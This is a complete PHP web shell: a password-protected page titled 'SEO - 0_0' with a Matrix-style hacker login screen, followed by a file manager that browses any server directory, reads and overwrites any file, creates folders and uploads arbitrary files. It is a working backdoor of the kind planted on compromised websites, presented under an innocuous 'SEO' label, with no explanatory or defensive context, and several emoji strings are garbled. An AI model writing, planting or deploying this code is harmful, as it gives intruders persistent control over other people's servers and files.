<?php
session_start();

// Hash password (gunakan hash yang valid)
$password = '$2y$10$7TIUJIRoVDFb.sCZo1QfHOuZY7sxqKdwXBRgLwjlC/Sh.ty/celui';

function login_shell()
{
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEO - 0_0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Orbitron', sans-serif;
            background: black;
            color: #00ff00;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
        }

        /* Efek hujan kode Matrix */
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        /* Efek glitch digital */
        .glitch {
            font-size: 20px;
            font-weight: bold;
            position: relative;
            animation: glitch 0.8s infinite;
        }

        @keyframes glitch {
            0% { text-shadow: 2px 2px #ff0000, -2px -2px #0000ff; }
            50% { text-shadow: -2px -2px #ff0000, 2px 2px #0000ff; }
            100% { text-shadow: 2px -2px #00ff00, -2px 2px #ff00ff; }
        }

        /* Efek terminal futuristik */
        .login-container {
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 0 15px #00ff00;
            width: 350px;
            text-align: left;
            animation: flicker 1.5s infinite alternate;
        }

        @keyframes flicker {
            0% { box-shadow: 0 0 10px #00ff00; }
            100% { box-shadow: 0 0 20px #00ff00; }
        }

        .login-container h2 {
            font-size: 18px;
            margin-bottom: 10px;
        }

        .terminal-text {
            font-size: 14px;
            color: #00ff00;
            display: block;
            margin-bottom: 10px;
        }

        .login-container input {
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-size: 14px;
            padding: 10px;
            width: 100%;
            margin-bottom: 10px;
            font-family: 'Orbitron', sans-serif;
            outline: none;
            text-align: center;
        }

        .login-container input::placeholder {
            color: rgba(0, 255, 0, 0.6);
        }

        .login-container input[type="submit"] {
            cursor: pointer;
            background: #00ff00;
            color: black;
            font-weight: bold;
            transition: 0.3s;
        }

        .login-container input[type="submit"]:hover {
            background: #008000;
        }

        .marquee-container {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #00ff00;
        }

        .marquee {
            display: inline-block;
            white-space: nowrap;
            overflow: hidden;
            font-size: 14px;
            animation: marquee 10s linear infinite;
        }

        @keyframes marquee {
            from { transform: translateX(100%); }
            to { transform: translateX(-100%); }
        }
    </style>
</head>
<body>

    <!-- Efek hujan kode Matrix -->
    <canvas id="matrixCanvas"></canvas>

    <div class="login-container">
        <h2 class="glitch">ÃƒÂ°Ã…Â¸Ã¢â‚¬Ã¢â‚¬â„¢ SEO - LT</h2>
        <span class="terminal-text">[ Access Restricted ]</span>
        <form action="" method="post">
            <input type="password" name="pass" placeholder="Enter Password" required>
            <br>
            <input type="submit" name="submit" value="Login">
        </form>
    </div>

    <div class="marquee-container">
        <div class="marquee">
            ÃƒÂ¢Ã…Â¡Ã‚Â¡ [SECURITY ALERT] Unauthorized access detected! ÃƒÂ¢Ã…Â¡Ã‚Â¡
        </div>
    </div>

    <script>
        // Efek Hujan Kode Matrix
        const canvas = document.getElementById("matrixCanvas");
        const ctx = canvas.getContext("2d");

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = [];

        for (let x = 0; x < columns; x++) {
            drops[x] = Math.floor(Math.random() * canvas.height);
        }

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = "#00FF00";
            ctx.font = fontSize + "px Orbitron";

            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }

                drops[i]++;
            }
        }

        setInterval(drawMatrix, 35);
    </script>

</body>
</html>
<?php
    exit;
}

// Cek login session
$session_key = md5($_SERVER['HTTP_HOST']);

if (!isset($_SESSION[$session_key])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password)) {
        session_regenerate_id(true); 
        $_SESSION[$session_key] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        login_shell();
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEO_File</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #181818;
            color: #f1f1f1;
        }
        #container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #252525;
        }
        h1, h2, h3 {
            text-align: center;
            color: #ffffff;
        }
        h2 {
            margin-top: 30px;
            color: #ffa500;
        }
        .item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px;
            margin: 5px 0;
            background-color: #333;
            border-radius: 5px;
        }
        .item a {
            color: #00ccff;
            text-decoration: none;
            flex: 1;
        }
        .item a:hover {
            text-decoration: underline;
            color: #ffa500;
        }
        .item span {
            color: #aaa;
            margin-left: 10px;
        }
        form {
            margin-top: 20px;
            background-color: #444;
            padding: 15px;
            border-radius: 5px;
        }
        input[type="text"], input[type="file"], input[type="submit"] {
            margin-bottom: 10px;
            padding: 8px;
            border: 1px solid #aaa;
            border-radius: 4px;
            width: calc(100% - 16px);
            background-color: #222;
            color: #fff;
        }
        input[type="submit"] {
            background-color: #007bff;
            color: #fff;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color:rgb(101, 90, 253);
        }
        hr {
            border: 0;
            height: 1px;
            background-color: #555;
            margin: 20px 0;
        }
    </style>
</head>
<body>
<div id="container">
    <h1>FILE MANAGER</h1>
    <?php
    function clean_input($input) {
        return htmlspecialchars(strip_tags($input));
    }

    function navigate_directory($path) {
        $path = str_replace('\\','/', $path);
        $paths = explode('/', $path);
        $breadcrumbs = [];

        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $breadcrumbs[] = '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            $breadcrumbs[] = '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                $breadcrumbs[] = "$paths[$i]";
                if ($i != $id) $breadcrumbs[] = "/";
            }
            $breadcrumbs[] = '">'.$pat.'</a>/';
        }

        return implode('', $breadcrumbs);
    }

    function display_directory_contents($path) {
        $contents = scandir($path);
        $folders = [];
        $files = [];

        foreach ($contents as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                $folders[] = '<div class="item"><span>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“</span><a href="?path=' . urlencode($full_path) . '">' . $item . '</a></div>';
            } else {
                $file_size = filesize($full_path);
                $size_unit = ['B', 'KB', 'MB', 'GB', 'TB'];
                $file_size_formatted = $file_size ? round($file_size / pow(1024, ($i = floor(log($file_size, 1024)))), 2) . ' ' . $size_unit[$i] : '0 B';
                $files[] = '<div class="item"><span>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Å¾</span><a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . $item . '</a><span>(' . $file_size_formatted . ')</span></div>';
            }
        }

        echo '<div class="folders">';
        echo implode('', $folders);
        echo '</div>';
        if (!empty($folders) && !empty($files)) {
            echo '<hr>';
        }
        echo '<div class="files">';
        echo implode('', $files);
        echo '</div>';
    }

    function create_folder($path, $folder_name) {
        $folder_name = clean_input($folder_name);
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            mkdir($new_folder_path);
            echo "<p style='color: #00ff00;'>Folder '$folder_name' created successfully!</p>";
        } else {
            echo "<p style='color: #ff0000;'>Folder '$folder_name' already exists!</p>";
        }
    }

    function upload_file($path, $file_to_upload) {
        $target_directory = $path . '/';
        $target_file = $target_directory . basename($file_to_upload['name']);
        
        if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
            echo "<p style='color: #00ff00;'>File ". htmlspecialchars(basename($file_to_upload['name'])). " uploaded successfully.</p>";
        } else {
            echo "<p style='color: #ff0000;'>Sorry, there was an error uploading your file.</p>";
        }
    }

    function edit_file($file_path) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['file_content'];
            if (file_put_contents($file_path, $content) !== false) {
                echo "<p style='color: #00ff00;'>File saved successfully.</p>";
            } else {
                echo "<p style='color: #ff0000;'>There was an error while saving the file.</p>";
            }
        }
        $content = file_get_contents($file_path);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" cols="50" style="width: 100%; height: 200px; border-radius: 4px; border: 1px solid #aaa; background-color: #222; color: #fff;">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
    }

    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }

    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        switch ($action) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                    $file_path = $path . '/' . $file;
                    if (file_exists($file_path)) {
                        echo '<h2>Edit File: ' . htmlspecialchars($file) . '</h2>';
                        edit_file($file_path);
                    } else {
                        echo "<p style='color: #ff0000;'>File not found.</p>";
                    }
                } else {
                    echo "<p style='color: #ff0000;'>Invalid file.</p>";
                }
                break;
            default:
                echo "<p style='color: #ff0000;'>Invalid action.</p>";
        }
    } else {
        echo "<h2>Directory: " . htmlspecialchars($path) . "</h2>";
        echo "<p>" . navigate_directory($path) . "</p>";
        echo "<h3>Directory Contents:</h3>";
        display_directory_contents($path);
        echo '<hr>';
        echo '<h3>Create New Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'New Folder Name: <input type="text" name="folder_name" required>';
        echo '<input type="submit" name="create_folder" value="Create Folder">';
        echo '</form>';
        echo '<h3>Upload New File:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo 'Select file to upload: <input type="file" name="file_to_upload" required>';
        echo '<input type="submit" name="upload_file" value="Upload File">';
        echo '</form>';
    }

    if (isset($_POST['create_folder'])) {
        create_folder($path, $_POST['folder_name']);
    }

    if (isset($_POST['upload_file'])) {
        upload_file($path, $_FILES['file_to_upload']);
    }
    ?>
</div>
</body>
</html>
